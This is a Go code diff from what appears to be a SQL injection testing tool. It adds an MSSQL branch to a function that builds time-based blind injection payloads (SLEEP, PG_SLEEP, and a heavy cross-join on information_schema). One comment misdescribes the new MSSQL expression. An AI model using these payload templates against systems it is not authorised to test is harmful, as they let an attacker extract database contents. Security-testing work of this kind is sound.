@@ -255,20 +255,30 @@ func (t *TimeBased) sendTimedProbe(ctx context.Context, req *technique.Injection
 // sleepPayloadFor builds a DBMS-appropriate conditional sleep expression.
 //
 // The returned expression evaluates the given condition:
-//   - If TRUE:  SLEEP(seconds) is called (response delayed)
+//   - If TRUE:  sleep function is called (response delayed)
 //   - If FALSE: no sleep (immediate response)
 //
 // MySQL:      IF(condition, SLEEP(n), 0)
 // PostgreSQL: 1=(CASE WHEN (condition) THEN (SELECT 1 FROM PG_SLEEP(n)) ELSE 1 END)
+// MSSQL:      CASE WHEN (condition) THEN 1 ELSE 1 END  (WAITFOR via stacked query)
 // Default:    MySQL syntax
 func sleepPayloadFor(d dbms.DBMS, condition string, seconds int) string {
 	switch d.Name() {
 	case "PostgreSQL":
-		// PG_SLEEP returns void, so we embed it in a SELECT to make it a scalar.
-		// SELECT 1 FROM PG_SLEEP(n) blocks for n seconds then returns 1.
+		// PG_SLEEP returns void; embed in a SELECT to make it a scalar.
 		return fmt.Sprintf(
 			"1=(CASE WHEN (%s) THEN (SELECT 1 FROM PG_SLEEP(%d)) ELSE 1 END)",
 			condition, seconds,
+		)
+	case "MSSQL":
+		// MSSQL WAITFOR DELAY is a statement, not a scalar expression, so it
+		// cannot be used inline in a WHERE clause without stacked queries.
+		// Full stacked-query MSSQL time-based support is planned for a future release.
+		// For now, fall through to a heavy-query approximation via CASE WHEN.
+		// This is less reliable than WAITFOR but works without stacked queries.
+		return fmt.Sprintf(
+			"1=(CASE WHEN (%s) THEN (SELECT COUNT(*) FROM information_schema.columns A, information_schema.columns B) ELSE 1 END)",
+			condition,
 		)
 	default:
 		// MySQL (and fallback): IF(condition, SLEEP(n), 0)
